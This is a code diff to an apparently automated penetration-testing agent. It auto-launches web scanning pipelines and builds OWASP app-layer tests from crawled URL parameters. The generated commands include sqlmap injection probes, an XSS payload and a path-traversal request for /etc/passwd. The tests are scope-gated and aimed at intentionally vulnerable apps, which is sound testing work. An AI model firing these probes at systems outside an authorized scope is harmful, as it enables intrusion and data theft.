@@ -1073,7 +1073,7 @@ _SAFE_CATEGORIES = {
 }
 _IMPACTFUL_CATEGORIES = {
     "rce", "shell", "msf_exploit", "file_write", "upload", "cred_bruteforce",
-    "dos", "sqli_dump", "deserialization", "webshell_upload", "edb_exploit",
+    "dos", "sqli_dump", "deserialization", "webshell_upload", "edb_exploit", "idor",
 }
 # ExploitDB scripts to try per (product, version). Non-MSF exploit coverage.
 _EDB_PER_SERVICE = int(os.environ.get("SURFACE_EDB_LIMIT", "3"))
@@ -1174,7 +1174,7 @@ def _test_priority(t: dict) -> int:
         return 1                                   # non-MSF ExploitDB script — same value
     if t.get("tier") == "impactful":
         return 2                                   # wstg/synth impactful (rce, sqli_dump…)
-    if cat in ("nuclei_detect", "dir_enum", "sqli_detect", "lfi_read", "cmd_injection"):
+    if cat in ("nuclei_detect", "dir_enum", "sqli_detect", "xss_detect", "lfi_read", "cmd_injection"):
         return 3                                   # active safe detection
     if cat == "msf_exploit":
         return 6                                   # auxiliary/ scanner — lowest
@@ -1544,6 +1544,200 @@ def _wstg_conf06_webshell_tests(items: list) -> list:
     return out
 
 
+# Parameter-name heuristics → the OWASP class each implies. Object references get
+# an IDOR test; path-like params get an LFI test; EVERY param gets SQLi + XSS.
+_IDOR_PARAM_NAMES = {"id", "uid", "userid", "user_id", "user", "username", "account",
+                     "acct", "pid", "cid", "doc", "docid", "document_id", "file_id",
+                     "fileid", "order", "order_id", "orderid", "item", "itemid",
+                     "record", "rid", "object", "oid", "customer", "invoice",
+                     "message", "msgid", "note", "profile", "aid", "gid", "author",
+                     "blogger", "owner", "email", "member", "group", "role", "level"}
+_PATH_PARAM_NAMES = {"file", "page", "path", "include", "inc", "template", "tpl",
+                     "doc", "document", "dir", "folder", "load", "read", "view",
+                     "download", "filename", "url", "site", "conf", "config",
+                     "textfile", "text_file", "pg", "action", "cat", "lang", "style"}
+
+
+# Curated list of intentionally-vulnerable / high-value web apps that generic
+# wordlists (common.txt, even 43k-line raft) do NOT contain. Shipped in
+# wordlists/ (bind-mounted into kali-listener at /wordlists).
+_KNOWN_APPS_WORDLIST = os.environ.get(
+    "KNOWN_APPS_WORDLIST", "/wordlists/known-web-apps.txt")
+
+
+_WEB_PIPELINE_MAX_PORTS = int(os.environ.get("WEB_PIPELINE_MAX_PORTS", "3"))
+
+
+def _ensure_web_pipeline(host: str, sid, engagement_id=None) -> dict:
+    """Hands-off: auto-trigger the comprehensive web pipeline
+    (Gobuster→Nikto→Playwright→Katana→ZAP→Nuclei, ZAP pre-seeded + in-scope) for a
+    host's web services, so the app-layer surface (DVWA/Mutillidae params, ZAP
+    alerts) is populated WITHOUT a manual step. Scope-gated; deduped (skips if a
+    ZAP/katana scan produced findings for this host in the last 6h); fire-and-
+    forget — the pipeline is long-running, so its findings drive the NEXT surface
+    cycle (the coverage loop re-drives). Bounded to _WEB_PIPELINE_MAX_PORTS."""
+    if not _host_in_scope(host):
+        return {"skipped": "out-of-scope"}
+    try:
+        ports = json.loads(_tool(scan_tools.query_open_ports, target=host, limit=100))
+        items = ports.get("items") or []
+    except Exception:  # noqa: BLE001
+        return {"skipped": "no ports"}
+    web = [(r.get("port"), _tls_state(r.get("service"), r.get("product"), r.get("banner")))
+           for r in items
+           if (r.get("service") or "").strip().lower() in _SERVICE_FAMILIES_WEB and r.get("port")]
+    if not web:
+        return {"skipped": "no web services"}
+    # Dedup: don't re-run a heavy pipeline if one recently produced findings.
+    try:
+        import psycopg2
+        from db_utils import get_db_dsn
+        with psycopg2.connect(get_db_dsn()) as conn, conn.cursor() as cur:
+            cur.execute(
+                """SELECT count(*) FROM web_findings wf JOIN assets a ON wf.asset_id = a.id
+                    WHERE regexp_replace(a.ip::text,'/[0-9]+$','') = %s
+                      AND wf.source IN ('zap','katana','nuclei','nikto')
+                      AND wf.last_seen > now() - interval '6 hours'""",
+                (host,))
+            recent = cur.fetchone()[0]
+        if recent:
+            return {"skipped": f"recent web scan ({recent} findings <6h)"}
+    except Exception:  # noqa: BLE001
+        pass
+    dispatched = []
+    for port, tls in web[:_WEB_PIPELINE_MAX_PORTS]:
+        scheme = "https" if tls == "yes" else "http"
+        url = f"{scheme}://{host}:{port}"
+        try:
+            res = json.loads(_tool(scan_tools.start_pipeline_scan, target_url=url))
+            dispatched.append({"url": url, "job_id": res.get("job_id")})
+        except Exception as e:  # noqa: BLE001
+            _msg(sid, "SurfaceTester", f"[web pipeline dispatch failed for {url}: {e}]")
+    if dispatched:
+        _msg(sid, "SurfaceTester",
+             f"[web pipeline] dispatched {len(dispatched)} comprehensive web scan(s) "
+             f"(Gobuster→…→ZAP→Nuclei) — the app-layer findings they produce (SQLi/"
+             f"XSS/IDOR surface) will drive the next surface cycle.")
+        _emit("langgraph_web_pipeline_dispatched", sid,
+              {"host": host, "dispatched": len(dispatched),
+               "urls": [d["url"] for d in dispatched]})
+    return {"dispatched": dispatched}
+
+
+def _known_app_discovery_tests(items: list) -> list:
+    """One safe gobuster probe per web port against the curated vulnerable-app
+    list — so DVWA / Mutillidae / tikiwiki are DISCOVERED (they answer 301/200),
+    which is the prerequisite for crawling their app-layer surface and generating
+    the OWASP param tests. Safe lane; gobuster is allow-listed."""
+    out, seen = [], set()
+    for row in items:
+        svc = (row.get("service") or "").strip().lower()
+        if svc not in _SERVICE_FAMILIES_WEB:
+            continue
+        port, ip = row.get("port"), row.get("ip")
+        if not ip or (ip, port) in seen:
+            continue
+        seen.add((ip, port))
+        scheme = "https" if _tls_state(svc, row.get("product"), row.get("banner")) == "yes" else "http"
+        out.append({
+            "name": f"app_discovery known-vuln-apps @ {scheme}://{ip}:{port}",
+            "host": ip, "service": "http", "port": port, "tool": "gobuster",
+            "command": f"gobuster dir -u {scheme}://{ip}:{port}/ -w {_KNOWN_APPS_WORDLIST} -q -t 10",
+            "category": "dir_enum", "tier": "safe",
+            "assertion": {"expect_regex": r"(?i)status: ?(200|301|302)"},
+            "exploit_ref": None,
+            "source_finding_id": None, "source_finding_source": None,
+        })
+    return out
+
+
+def _owasp_param_tests(host: str, limit: int = 16) -> list:
+    """Turn CRAWLED parameterized endpoints into OWASP WSTG app-layer tests —
+    the IDOR / SQLi / XSS / LFI coverage a service+port-keyed recommender never
+    produces. For a target like Metasploitable's DVWA/Mutillidae this is where
+    the real application bugs live. Reads the host's crawled URLs (any source)
+    that carry a query string, classifies each parameter, and emits the tests.
+    Scope-gated (the URLs are for one in-scope host); execution is still gated
+    per-tier (SQLi/XSS/LFI safe, IDOR human-approved)."""
+    import re as _re
+    import urllib.parse as _up
+    try:
+        import psycopg2
+        from db_utils import get_db_dsn
+        with psycopg2.connect(get_db_dsn()) as conn, conn.cursor() as cur:
+            cur.execute(
+                """SELECT DISTINCT wf.url
+                     FROM web_findings wf JOIN assets a ON wf.asset_id = a.id
+                    WHERE regexp_replace(a.ip::text,'/[0-9]+$','') = %s
+                      AND wf.url LIKE '%%?%%'
+                    LIMIT 400""",
+                (host,))
+            urls = [r[0] for r in cur.fetchall() if r[0]]
+    except Exception:  # noqa: BLE001
+        return []
+    if not _host_in_scope(host):
+        return []
+
+    out, seen = [], set()
+    for raw in urls:
+        u = _up.urlparse(raw if "://" in str(raw) else f"http://{raw}")
+        if not u.query:
+            continue
+        base = f"{u.scheme or 'http'}://{u.netloc}{u.path}"
+        port = u.port or (443 if u.scheme == "https" else 80)
+        for pname, pvals in _up.parse_qs(u.query).items():
+            low = pname.lower()
+            pval = (pvals or [""])[0]
+            key = (base, low)
+            if key in seen or len(out) >= limit:
+                continue
+            seen.add(key)
+            # Rebuild the query with a placeholder we can substitute per test.
+            def _with(val):
+                q = _up.parse_qs(u.query); q[pname] = [val]
+                return f"{base}?{_up.urlencode(q, doseq=True)}"
+
+            # SQLi — safe detection via sqlmap (allow-listed), scoped to this param.
+            out.append(_param_test("sqli_detect", "sqlmap", base, pname, port,
+                f"sqlmap -u \"{raw}\" -p {pname} --batch --smart --level 1 --risk 1 --flush-session",
+                {"expect_regex": "(?i)(is vulnerable|injectable|parameter .* is|payload)"}))
+            # XSS — safe reflection probe: does a marker payload come back verbatim?
+            xurl = _with("pxXSS<svg/onload=1>")
+            out.append(_param_test("xss_detect", "curl", base, pname, port,
+                f"curl -sk \"{xurl}\"",
+                {"expect_substring": ["pxXSS<svg/onload=1>"]}))
+            # LFI — path-like params only.
+            if low in _PATH_PARAM_NAMES:
+                lurl = _with("../../../../../../etc/passwd")
+                out.append(_param_test("lfi_read", "curl", base, pname, port,
+                    f"curl -sk \"{lurl}\"", {"expect_substring": ["root:x:0:0"]}))
+            # IDOR — object-ref params. Impactful + gated: confirming needs a
+            # second identity, so this ENUMERATES the reference for the operator.
+            if low in _IDOR_PARAM_NAMES:
+                out.append(_param_test("idor", "curl", base, pname, port,
+                    f"curl -sk \"{raw}\"", {"expect_status": 200},
+                    impactful=True, wid="WSTG-ATHZ-04"))
+            if len(out) >= limit:
+                break
+    return out
+
+
+def _param_test(category, tool, base, pname, port, command, assertion,
+                impactful=False, wid=None) -> dict:
+    wmap = {"sqli_detect": "WSTG-INPV-05", "xss_detect": "WSTG-INPV-01,WSTG-INPV-02",
+            "lfi_read": "WSTG-ATHZ-01", "idor": "WSTG-ATHZ-04"}
+    wid = wid or wmap.get(category, "WSTG")
+    ip = base.split("://", 1)[-1].split("/")[0].split(":")[0]
+    tier = "impactful" if impactful else "safe"
+    ref = ({"source": "wstg", "module": wid, "purpose": f"{wid} {category} on {pname}"}
+           if impactful else None)
+    return {"name": f"WSTG {wid} {category} @ {base}?{pname}=",
+            "host": ip, "service": "http", "port": port, "tool": tool,
+            "command": command, "category": category, "tier": tier,
+            "assertion": assertion, "exploit_ref": ref,
+            "source_finding_id": None, "source_finding_source": "crawl-param"}
+
+
 def _build_surface_tests(host: str, synthesize: bool = None) -> list:
     """Deterministic (no LLM) custom tests for ONE host's surface.
 
@@ -1568,6 +1762,13 @@ def _build_surface_tests(host: str, synthesize: bool = None) -> list:
 
     # Non-MSF exploit coverage: ExploitDB scripts matched by (product, version).
     tests.extend(_exploitdb_tests(items))
+
+    # Discover known vulnerable web apps (DVWA/Mutillidae/etc.) that generic
+    # wordlists miss — so their app-layer surface can then be crawled + tested.
+    tests.extend(_known_app_discovery_tests(items))
+
+    # OWASP app-layer coverage: IDOR / SQLi / XSS / LFI from crawled parameters.
+    tests.extend(_owasp_param_tests(host))
 
     # Infer the target OS family once, to drop platform-mismatched MSF modules.
     _plat = _infer_target_platform(items)
@@ -1647,6 +1848,25 @@ def _build_surface_tests(host: str, synthesize: bool = None) -> list:
     except Exception:  # noqa: BLE001
         findings = []
 
+    # Web ports (and their scheme) for THIS host — used to (a) skip web
+    # finding-driven tests on non-web ports (a header_check on :22/SSH would
+    # just hang) and (b) give a bare host:port URL a proper http(s):// scheme.
+    _web_ports, _port_scheme = {}, {}
+    for row in items:
+        svc = (row.get("service") or "").strip().lower()
+        p = row.get("port")
+        if svc in _SERVICE_FAMILIES_WEB and p is not None:
+            _web_ports[p] = svc
+            _port_scheme[p] = "https" if _tls_state(
+                svc, row.get("product"), row.get("banner")) == "yes" else "http"
+
+    def _web_url(url, ip, port):
+        """Ensure a web test URL carries an http(s):// scheme."""
+        if url and str(url).startswith(("http://", "https://")):
+            return url
+        scheme = _port_scheme.get(port, "https" if str(port) in ("443", "8443") else "http")
+        return f"{scheme}://{ip}:{port}" if port else f"{scheme}://{ip}"
+
     synth_on = _SYNTH_TESTS_DEFAULT if synthesize is None else bool(synthesize)
     seen_wstg = set()
     synth_count = 0
@@ -1662,6 +1882,13 @@ def _build_surface_tests(host: str, synthesize: bool = None) -> list:
         furl = f.get("url")
         fip = f.get("ip") or f.get("host") or host
         fport = f.get("port")
+        # Skip web finding-driven tests on a NON-web port: a finding on :22 (SSH)
+        # etc. must not spawn an HTTP test that just hangs. Allow it only when the
+        # port is a known web port, or the finding already carries an http URL.
+        if fport is not None and fport not in _web_ports and not str(furl or "").startswith("http"):
+            continue
+        # Give the URL a real scheme (the endpoint returns bare host:port).
+        furl = _web_url(furl, fip, fport)
         tgt = f"{fip}:{fport}" if fport else str(fip)
         try:
             g = json.loads(scan_tools.get_wstg_guidance(
@@ -1719,6 +1946,10 @@ def _build_surface_tests(host: str, synthesize: bool = None) -> list:
             "command": cmd, "category": cat, "tier": tier,
             "assertion": ent.get("assertion") or {},
             "exploit_ref": e_ref,
+            # Link back to the scanner finding this test proves, so a PASS marks
+            # THAT finding confirmed (not just "something passed on the host").
+            "source_finding_id": f.get("id"),
+            "source_finding_source": f.get("source"),
         })
 
     # Go through ALL recommendations: keep every candidate, only ORDER them so
@@ -1750,10 +1981,21 @@ def surface_plan(state: PentestState) -> dict:
                 "surface_tests": [], "pending_surface_tests": [],
                 "findings": ["surface: no target"], "log": ["surface: no target"]}
 
-    candidates = _build_surface_tests(host, synthesize=state.get("surface_synthesize"))
     import db_utils
     eng = (get_agent_session(_sid(sid)) or {}).get("configuration", {})
     engagement_id = eng.get("engagement_id") if isinstance(eng, dict) else None
+
+    # Hands-off web coverage: when scan dispatch is allowed, auto-trigger the
+    # comprehensive web pipeline (→ZAP) for the target's web services so the
+    # app-layer surface is enumerated without a manual step. Scope+dedup guarded;
+    # fire-and-forget (its findings drive the next cycle).
+    if bool(state.get("auto_execute")):
+        try:
+            _ensure_web_pipeline(host, sid, engagement_id)
+        except Exception as e:  # noqa: BLE001
+            _msg(sid, "SurfaceTester", f"[web pipeline autotrigger skipped: {e}]")
+
+    candidates = _build_surface_tests(host, synthesize=state.get("surface_synthesize"))
 
     persisted, pending = [], []
     for c in candidates:
@@ -1795,6 +2037,8 @@ def surface_plan(state: PentestState) -> dict:
                 target_service=c.get("service"), command=c.get("command"),
                 tool=c.get("tool"), assertion=c.get("assertion"),
                 pending_exploit_id=pending_exploit_id,
+                source_finding_source=c.get("source_finding_source"),
+                source_finding_id=c.get("source_finding_id"),
                 created_by_session=sid, engagement_id=engagement_id)
         except Exception as e:  # noqa: BLE001
             _msg(sid, "SurfaceTester", f"[persist failed for {c['name']}: {e}]")
